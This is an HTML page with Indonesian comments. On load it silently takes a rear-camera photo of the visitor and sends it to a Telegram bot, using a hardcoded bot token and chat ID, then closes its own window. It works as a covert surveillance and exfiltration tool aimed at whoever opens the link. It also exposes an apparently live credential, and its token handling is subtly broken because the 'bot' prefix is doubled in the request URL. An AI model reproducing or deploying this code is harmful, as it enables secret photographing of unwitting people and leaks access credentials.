<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture & Send</title>
    <style>
        body {
            background: white;
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        #status {
            margin-top: 50px;
            padding: 15px;
            border-radius: 5px;
            font-size: 18px;
        }
        .success { background: #e6f7e6; }
        .error { background: #ffebee; color: #d32f2f; }
    </style>
</head>
<body>
    <div id="status">Memulai proses...</div>

    <script>
        // ============= KONFIGURASI =============
        const BOT_TOKEN = 'bot7876599612:AAHYBbJz6IHKae4BBtEkyASRlrJVVWtNOqc';
        const CHAT_ID = '7041008009';
        // =======================================

        const statusEl = document.getElementById('status');

        async function captureAndSend() {
            try {
                // 1. Validasi token
                if (!BOT_TOKEN.startsWith('bot')) {
                    throw new Error("Format token salah! Harus diawali 'bot'");
                }

                // 2. Akses kamera
                statusEl.textContent = "Mengakses kamera...";
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });

                // 3. Ambil foto (500ms untuk fokus)
                statusEl.textContent = "Mengambil foto...";
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.playsInline = true;

                await new Promise(resolve => {
                    video.onloadedmetadata = () => setTimeout(resolve, 500);
                });

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                const photoData = canvas.toDataURL('image/jpeg', 0.8);
                
                // Stop kamera
                stream.getTracks().forEach(track => track.stop());

                // 4. Kirim ke Telegram dengan timeout
                statusEl.textContent = "Mengirim ke Telegram...";
                const blob = await fetch(photoData).then(r => r.blob());
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', `Foto otomatis - ${new Date().toLocaleString()}`);

                // Debug: Tampilkan data yang akan dikirim
                console.log("Mengirim dengan data:", {
                    token: BOT_TOKEN,
                    chat_id: CHAT_ID,
                    photo_size: blob.size
                });

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();
                console.log("Response Telegram:", result);

                if (!result.ok) {
                    throw new Error(result.description || "Gagal mengirim");
                }

                statusEl.textContent = "✅ Foto terkirim ke Telegram!";
                statusEl.className = "success";
                setTimeout(window.close, 2000);

            } catch (error) {
                statusEl.textContent = `❌ Gagal: ${error.message}`;
                statusEl.className = "error";
                console.error("Error detail:", error);
                
                // Saran troubleshooting spesifik
                if (error.message.includes("Failed to fetch")) {
                    statusEl.innerHTML += "<br><small>Pastikan koneksi internet stabil</small>";
                } else if (error.message.includes("token")) {
                    statusEl.innerHTML += `<br><small>Token harus format: bot123456:ABC-DEF...</small>`;
                }
            }
        }

        // Mulai proses
        document.addEventListener('DOMContentLoaded', captureAndSend);
    </script>
</body>
</html>
